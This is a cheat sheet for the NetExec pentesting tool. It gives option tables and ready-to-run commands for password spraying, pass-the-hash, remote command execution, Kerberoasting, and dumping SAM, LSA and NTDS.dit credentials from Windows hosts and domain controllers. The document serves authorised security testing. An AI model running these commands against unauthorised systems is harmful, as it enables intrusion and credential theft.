# netexec

> Network execution tool for pentesting (CrackMapExec successor).

## Quickstart

```bash
# SMB - check access
nxc smb 10.10.10.10 -u user -p password

# SMB - list shares
nxc smb 10.10.10.10 -u user -p password --shares

# WinRM - exec command
nxc winrm 10.10.10.10 -u user -p password -x "whoami"

# Password spray
nxc smb 10.10.10.0/24 -u users.txt -p password
```

## Core Concepts

| Concept | Description |
|---------|-------------|
| Protocols | smb, winrm, ldap, mssql, ssh, rdp, wmi |
| Credential testing | Spray, pass-the-hash |
| Execution | Remote command execution |
| Enumeration | Users, shares, policies |

## Syntax

```text
nxc <protocol> <target> [options]
```

## Options

### Target

| Option | Description |
|--------|-------------|
| `<target>` | IP, CIDR, hostname, file |

### Authentication

| Option | Description |
|--------|-------------|
| `-u <user>` | Username (or file) |
| `-p <pass>` | Password (or file) |
| `-H <hash>` | NTLM hash |
| `-d <domain>` | Domain |
| `--local-auth` | Local authentication |
| `-k` | Kerberos auth |

### Execution

| Option | Description |
|--------|-------------|
| `-x <cmd>` | Execute command |
| `-X <ps>` | PowerShell command |
| `--exec-method <m>` | Execution method |

### SMB Options

| Option | Description |
|--------|-------------|
| `--shares` | List shares |
| `--users` | List users |
| `--groups` | List groups |
| `--loggedon-users` | Logged on users |
| `--sessions` | Active sessions |
| `--pass-pol` | Password policy |
| `--rid-brute` | RID brute force |
| `--sam` | Dump SAM |
| `--lsa` | Dump LSA |
| `--ntds` | Dump NTDS.dit |

### Output

| Option | Description |
|--------|-------------|
| `-o <file>` | Output file |
| `--export <fmt>` | Export format |

## Recipes

### SMB Enumeration

```bash
# Check credentials
nxc smb 10.10.10.10 -u user -p password

# List shares
nxc smb 10.10.10.10 -u user -p password --shares

# List users
nxc smb 10.10.10.10 -u user -p password --users

# Password policy
nxc smb 10.10.10.10 -u user -p password --pass-pol

# RID brute force
nxc smb 10.10.10.10 -u user -p password --rid-brute

# Logged on users
nxc smb 10.10.10.10 -u user -p password --loggedon-users
```

### Credential Attacks

```bash
# Password spray (single pass, multiple users)
nxc smb 10.10.10.10 -u users.txt -p 'Password123'

# Multiple passwords
nxc smb 10.10.10.10 -u users.txt -p passwords.txt

# Pass-the-hash
nxc smb 10.10.10.10 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:hash'

# Local auth
nxc smb 10.10.10.10 -u admin -p password --local-auth
```

### Command Execution

```bash
# CMD command
nxc smb 10.10.10.10 -u admin -p password -x "whoami"

# PowerShell
nxc smb 10.10.10.10 -u admin -p password -X "Get-Process"

# WinRM execution
nxc winrm 10.10.10.10 -u admin -p password -x "whoami"
```

### Credential Dumping

```bash
# Dump SAM
nxc smb 10.10.10.10 -u admin -p password --sam

# Dump LSA
nxc smb 10.10.10.10 -u admin -p password --lsa

# Dump NTDS (DC)
nxc smb dc.target.com -u admin -p password --ntds

# Dump with method
nxc smb 10.10.10.10 -u admin -p password --ntds vss
```

### Network Scanning

```bash
# Scan subnet
nxc smb 10.10.10.0/24

# With credentials
nxc smb 10.10.10.0/24 -u user -p password

# From file
nxc smb hosts.txt -u user -p password
```

### LDAP

```bash
# LDAP enum
nxc ldap dc.target.com -u user -p password

# Get users
nxc ldap dc.target.com -u user -p password --users

# Get groups
nxc ldap dc.target.com -u user -p password --groups

# Kerberoasting
nxc ldap dc.target.com -u user -p password --kerberoasting output.txt

# AS-REP roasting
nxc ldap dc.target.com -u user -p password --asreproast output.txt
```

### MSSQL

```bash
# Check access
nxc mssql 10.10.10.10 -u sa -p password

# Execute query
nxc mssql 10.10.10.10 -u sa -p password -q "SELECT @@version"

# Execute command (xp_cmdshell)
nxc mssql 10.10.10.10 -u sa -p password -x "whoami"
```

### WinRM

```bash
# Check access
nxc winrm 10.10.10.10 -u user -p password

# Execute command
nxc winrm 10.10.10.10 -u user -p password -x "whoami"

# PowerShell
nxc winrm 10.10.10.10 -u user -p password -X "Get-Process"
```

### SSH

```bash
# SSH access
nxc ssh 10.10.10.10 -u user -p password

# Execute command
nxc ssh 10.10.10.10 -u user -p password -x "id"
```

## Output & Parsing

```bash
# Save output
nxc smb 10.10.10.0/24 -u user -p password -o results.txt

# Export JSON
nxc smb 10.10.10.0/24 -u user -p password --export json results.json

# Grep for success
nxc smb 10.10.10.0/24 -u user -p password 2>&1 | grep "+"
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Connection refused | Check port, service |
| Access denied | Verify creds, try `--local-auth` |
| Kerberos errors | Check time sync, use `-k` |
| SMB signing | `--smb-signing off` |

## References

- [NetExec GitHub](https://github.com/Pennyw0rth/NetExec)
- [NetExec Wiki](https://www.netexec.wiki/)
